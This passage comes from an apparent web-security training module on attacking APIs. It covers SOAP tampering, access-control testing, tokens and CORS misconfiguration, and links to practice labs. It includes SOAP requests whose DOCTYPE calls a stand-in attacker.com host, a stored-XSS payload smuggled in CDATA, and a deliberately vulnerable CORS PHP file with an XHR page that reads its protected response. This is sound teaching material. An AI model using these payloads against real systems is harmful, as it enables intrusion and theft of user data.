            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">sam:login</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span>
</code></pre><p>Of course, the API implementation itself might be vulnerable to XXE attacks; however, modern APIs usually disallow DTD declarations.</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/sample</span> HTTP/1.1
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Content-Type</span>: text/xml;charset=UTF-8
<span class="hljs-attribute">SOAPAction</span>: "http://www.soapui.org/sample/login"
<span class="hljs-attribute">Content-Length</span>: 297
<span class="hljs-attribute">Host</span>: www.soapui.org
<span class="hljs-attribute">User-Agent</span>: Apache-HttpClient/4.1.1
<span class="hljs-attribute">Connection</span>: close

<span class="xml"><span class="hljs-meta">&lt;!DOCTYPE soapenv:Envelope SYSTEM http://attacker.com/ssrf&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/ "</span> <span class="hljs-attr">xmlns:sam</span>=<span class="hljs-string">"http://www.soapui.org/sample/"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sam:login</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>?<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>?<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">sam:login</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span>
</code></pre><p>Basically, you are free to tamper with any of the API parameters as long as the SOAP message structure is correct.</p>
<p>In case you want to smuggle XML-style data, you can wrap them up in CDATA tags (XML comments), so the SOAP message is valid.</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/storeData</span> HTTP/1.1
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Content-Type</span>: text/xml;charset=UTF-8
<span class="hljs-attribute">SOAPAction</span>: "http://www.soapui.org/sample/login"
<span class="hljs-attribute">Content-Length</span>: 297
<span class="hljs-attribute">Host</span>: www.soapui.org
<span class="hljs-attribute">User-Agent</span>: Apache-HttpClient/4.1.1
<span class="hljs-attribute">Connection</span>: close

<span class="xml"><span class="hljs-meta">&lt;!DOCTYPE soapenv:Envelope SYSTEM http://attacker.com/ssrf&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/ "</span> <span class="hljs-attr">xmlns:sam</span>=<span class="hljs-string">"http://www.soapui.org/sample/"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sam:storeData</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>&lt;![CDATA[&lt;script&gt;alert('stored xss!')&lt;/script&gt;]]&lt;/text&gt;
        &lt;/sam:storeData&gt;
    &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;</span>
</code></pre><h2 id="-api-access-control-"><strong>API Access Control</strong></h2>
<p>In larger APIs, not every method is designed to be used by each user. For example, the most common split is between read-only users and read+write users. The latter has the possibility to modify the contents of the API backend.</p>
<p>In APIs, you will rarely see cookies being used. More often, the authentication mechanism will be basic authorization or a kind of token – it can be a pre-generated token that will be equivalent of a cookie, for example in the form of a header, like <code>X-Api-Token: adk32Kds38au39aU0s</code>.</p>
<p>Due to API requirements some specific content types or custom headers are used along with the non-cookie authentication, as they are less likely to be vulnerable to Cross-Site Request Forgery attacks. However, what often is found in the APIs is broken access control. For example, Authorization Bypasses are very common.</p>
<p>In order to test an API in a complex way for Access control flaws, one needs to:</p>
<ul>
<li>Prepare a working request to each API endpoint</li>
<li>Generate a token (or authorization header) for each of the API users</li>
<li>Combine each API request with each token to see which will work and which do not</li>
<li>Remember to test each request, also without any token</li>
</ul>
<p>Again, such test cases might be generated using SoapUI, which allows us to issue a request to each API endpoint. Also, as a reminder, double-check if the API implementation uses all the methods provided by the original version. For example, with Rundeck API there is a default possibility of running OS commands, which might be hidden from the documentation on a local API implementation.</p>
<ul>
<li><a href="https://docs.rundeck.com/docs/api/rundeck-api.html#adhoc">https://docs.rundeck.com/docs/api/rundeck-api.html#adhoc</a></li>
</ul>
<p>API tokens are susceptible to vulnerabilities commonly diagnosed in session cookies, for example:</p>
<ul>
<li>Low entropy or predictable value</li>
<li>Lack of invalidation</li>
<li>Possible token leaks from the application infrastructure or possibility to generate tokens in advance</li>
</ul>
<p>Specific tokens that might grant you access to an API interface are JWT tokens, as well as the so-called Bearer Authentication.</p>
<p>These tokens will be explained more in detail in the „Attacking Authentication &amp; SSO” module.</p>
<h2 id="-resource-sharing-"><strong>Resource Sharing</strong></h2>
<p>As APIs are often used both by humans and machines, the latter have to be able to read the API results using scripted solutions.</p>
<p>Let’s say you want to get the content of a different website, example.com, on your webpage. Consider the following code:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
            <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
            xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> </span>{
                <span class="hljs-keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) {
                    alert(xhr.responseText);
                }
            }
            xhr.open(<span class="hljs-string">'GET'</span>, <span class="hljs-string">'http://example.com'</span>, <span class="hljs-literal">true</span>);
            xhr.send(<span class="hljs-literal">null</span>);
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>If you now try to receive the response content of the example.com page, it will be blocked by the browser. Accordingly, if someone enters a site with a similar script and the response content will be attempted to be sent instead of just displayed, the same constraint appears. It will not be possible for the client-side javascript to read the response due to Same Origin Policy restrictions.</p>
<p>As APIs are meant to be also accessed by automated agents in order to lose SOP constraints a bit, the Cross Origin Resource Sharing standard was implemented. Simply put, CORS can add some exceptions to SOP by specifying some special headers in the server response.</p>
<p>We will be interested in two of these headers:</p>
<ul>
<li>Access-Control-Allow-Origin: [value]</li>
<li>And Access-Control-Allow-Credentials: [true/false]</li>
</ul>
<p>The first one specifies a domain that can access a certain website’s response, while the second one specifies if it is possible to add credentialing information (e.g., Cookies) to the request.</p>
<p>Access-Control-Allow-Origin value can be a domain, a wildcard, or null. A wildcard means that a script hosted on any domain can access a response from that webpage. A certain domain value means that scripts (or any other user) from that domain can access the response.</p>
<p>For example, if the page victim.com sends back the header <code>Access-Control-Allow-Origin: example.com</code>, that means that if an XHR requesting victim.com script is hosted on example.com, and if the user visits example.com, the script will access victim.com as that user and receive the response. However, if it is a static page, then nothing special happens unless the victim.com allows another header <code>Access Control-Allow-Credentials: true</code>.</p>
<p>In that case, if the user is logged on on victim.com and visits the mentioned script on example.com, victim.com will be visited in the context of logged-in users (the cookies will be sent with an XHR request) and restricted content can be stolen! Browsers by default block responses if a site is overly permissive (if they allow wildcard origin together with credentials).</p>
<p>Trust with credentials to the arbitrary origin is a common vulnerability, not only in APIs. That means if a page is accessible only for logged in users and it trusts the arbitrary origin, an exploit script can be hosted on an attacker controlled domain. Once visited by a user logged in on the target website, it can steal sensitive information – user data or CSRF tokens.</p>
<p>Let’s take a look at a simple exploitation case. We will issue a similar XHR request to a CORS-enabled page.</p>
<p>A file is hosted on a php enabled apache server:</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
    header(<span class="hljs-string">"Access-Control-Allow-Origin: "</span> . $_SERVER[<span class="hljs-string">'HTTP_ORIGIN'</span>]);
    header(<span class="hljs-string">"Access-Control-Allow-Credentials: true"</span>);

    <span class="hljs-keyword">echo</span> <span class="hljs-string">"TOP SECRET STUFF"</span>;
<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>If you now navigate to that page while using Burp Suite as a proxy, you can observe how it reacts to a custom „Origin” header.</p>
<pre><code><span class="hljs-symbol">Origin:</span> attacker.com
</code></pre><pre><code><span class="hljs-keyword">Access</span>-Control-Allow-Origin: attacker.com
</code></pre><p>The XHR script is now modified and example.com is replaced with the CORS enabled page:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
            <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
            xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> </span>{
                <span class="hljs-keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) {
                    alert(xhr.responseText);
                }
            }
            xhr.open(<span class="hljs-string">'GET'</span>, <span class="hljs-string">'http://192.168.139.195/cors.php'</span>, <span class="hljs-literal">true</span>);
            xhr.send(<span class="hljs-literal">null</span>);
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>You can now observe that access to the response was gained. In an exploitation scenario, you may instead want to send this data to your controlled server in a similar way that you would steal a cookie using an XSS vulnerability.</p>
<h2 id="-labs-"><strong>Labs</strong></h2>
<h4 id="-apis-"><strong>APIs</strong></h4>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#api-testing">https://portswigger.net/web-security/all-labs#api-testing</a></li>
<li><a href="https://github.com/cerberauth/api-vulns-challenges">https://github.com/cerberauth/api-vulns-challenges</a></li>
<li><a href="https://github.com/djwester/api-testing-challenges">https://github.com/djwester/api-testing-challenges</a><h4 id="-graphql-"><strong>GraphQL</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#graphql-api-vulnerabilities">https://portswigger.net/web-security/all-labs#graphql-api-vulnerabilities</a></li>
<li><a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application</a><h4 id="-cors-"><strong>CORs</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors">https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors</a></li>
<li><a href="https://github.com/incredibleindishell/CORS-vulnerable-Lab">https://github.com/incredibleindishell/CORS-vulnerable-Lab</a></li>
</ul>
<hr>
<h1 id="-labs-"><strong>Labs</strong></h1>
<h3 id="-additional-resources-labs-"><strong>Additional Resources &amp; Labs</strong></h3>
<p>For additional lab, check out these github repos.</p>
<ol>
<li><a href="https://github.com/juice-shop/juice-shop">Juice Shop</a></li>
<li><a href="https://github.com/WebGoat/WebGoat">WebGoat</a></li>
<li><a href="https://github.com/digininja/DVWA">DVWA</a></li>
<li><a href="https://github.com/rapid7/hackazon">Hackazon</a></li>
<li><a href="ttps://www.root-me.org">Root Me</a></li>
<li><a href="https://ctftime.org">CTFtime</a></li>
<li><a href="https://picoctf.org/">PicoCTF</a></li>
</ol>
<p>And For more resource, check out these platforms.</p>
<ol>
<li><a href="https://portswigger.net/web-security">PortSwigger</a></li>
<li><a href="https://www.cyberseclabs.co.uk">CyberSecLabs</a></li>
</ol>
